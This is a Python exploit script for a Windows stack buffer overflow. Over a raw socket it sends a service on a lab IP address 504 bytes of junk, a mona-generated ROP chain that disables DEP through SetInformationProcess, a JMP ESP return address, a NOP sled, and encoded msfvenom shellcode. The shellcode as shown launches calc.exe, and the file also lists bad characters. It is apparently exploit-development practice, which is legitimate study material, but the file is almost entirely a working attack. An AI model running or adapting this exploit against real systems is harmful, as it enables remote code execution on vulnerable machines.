from pwn import *
import socket
import struct

# dep bypass

PORT = 200
HOST = "192.168.71.131"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# payload = cyclic(1000) 504
junk = b"A" * 504
# Address=7E4456F7 Message=  0x7e4456f7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [USER32.DLL] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.DLL)

eip = struct.pack("<I", 0x7e4456f7)
nop_sled = b"\x90" * 16
"""
└─# msfvenom -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -f python -b "\x00"                                                                                                                         130 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of python file: 1078 bytes
"""
buf =  b""
buf += b"\xd9\xe1\xd9\x74\x24\xf4\x5b\x29\xc9\xb8\x2d\xc6\x8e"
buf += b"\x9e\xb1\x31\x31\x43\x18\x03\x43\x18\x83\xeb\xd1\x24"
buf += b"\x7b\x62\xc1\x2b\x84\x9b\x11\x4c\x0c\x7e\x20\x4c\x6a"
buf += b"\x0a\x12\x7c\xf8\x5e\x9e\xf7\xac\x4a\x15\x75\x79\x7c"
buf += b"\x9e\x30\x5f\xb3\x1f\x68\xa3\xd2\xa3\x73\xf0\x34\x9a"
buf += b"\xbb\x05\x34\xdb\xa6\xe4\x64\xb4\xad\x5b\x99\xb1\xf8"
buf += b"\x67\x12\x89\xed\xef\xc7\x59\x0f\xc1\x59\xd2\x56\xc1"
buf += b"\x58\x37\xe3\x48\x43\x54\xce\x03\xf8\xae\xa4\x95\x28"
buf += b"\xff\x45\x39\x15\x30\xb4\x43\x51\xf6\x27\x36\xab\x05"
buf += b"\xd5\x41\x68\x74\x01\xc7\x6b\xde\xc2\x7f\x50\xdf\x07"
buf += b"\x19\x13\xd3\xec\x6d\x7b\xf7\xf3\xa2\xf7\x03\x7f\x45"
buf += b"\xd8\x82\x3b\x62\xfc\xcf\x98\x0b\xa5\xb5\x4f\x33\xb5"
buf += b"\x16\x2f\x91\xbd\xba\x24\xa8\x9f\xd0\xbb\x3e\x9a\x96"
buf += b"\xbc\x40\xa5\x86\xd4\x71\x2e\x49\xa2\x8d\xe5\x2e\x5c"
buf += b"\xc4\xa4\x06\xf5\x81\x3c\x1b\x98\x31\xeb\x5f\xa5\xb1"
buf += b"\x1e\x1f\x52\xa9\x6a\x1a\x1e\x6d\x86\x56\x0f\x18\xa8"
buf += b"\xc5\x30\x09\xcb\x88\xa2\xd1\x22\x2f\x43\x73\x3b"

shellcode = buf
# \x00
badchars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
badchars += b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
badchars += b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
badchars += b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
badchars += b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
badchars += b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
badchars += b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
badchars += b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x77c521ee,  # POP ECX # RETN [msvcrt.dll] 
      0x77dd1404,  # ptr to &SetInformationProcess() [IAT ADVAPI32.dll]
      0x7e45373d,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.DLL] 
      0x77e8392e,  # XCHG EAX,EBP # RETN [RPCRT4.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x77c4ded4,  # POP EAX # RETN [msvcrt.dll] 
      0xffffffde,  # Value to negate, will become 0x00000022
      0x77e8c784,  # NEG EAX # RETN [RPCRT4.dll] 
      0x77c58fbc,  # XCHG EAX,EDX # RETN [msvcrt.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77c42ebc,  # POP ECX # RETN [msvcrt.dll] 
      0x73d911dc,  # &0x00000002 [CRTDLL.DLL]
      #[---INFO:gadgets_to_set_ebx:---]
      0x73d995f9,  # POP EBX # RETN [CRTDLL.DLL] 
      0xffffffff,  # 0xffffffff-> ebx
      #[---INFO:gadgets_to_set_eax:---]
      0x7c880176,  # POP EAX # RETN [kernel32.dll] 
      0xfffffffc,  # Value to negate, will become 0x00000004
      0x73da468c,  # NEG EAX # RETN [CRTDLL.DLL] 
      #[---INFO:gadgets_to_set_edi:---]
      0x7c902563,  # POP EDI # RETN [ntdll.dll] 
      0x7c902563,  # skip 4 bytes [ntdll.dll]
      #[---INFO:pushad:---]
      0x7e423ad9,  # PUSHAD # RETN [USER32.DLL] 
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

payload = junk + rop_chain + eip + nop_sled + shellcode
s.send(payload)
s.close()
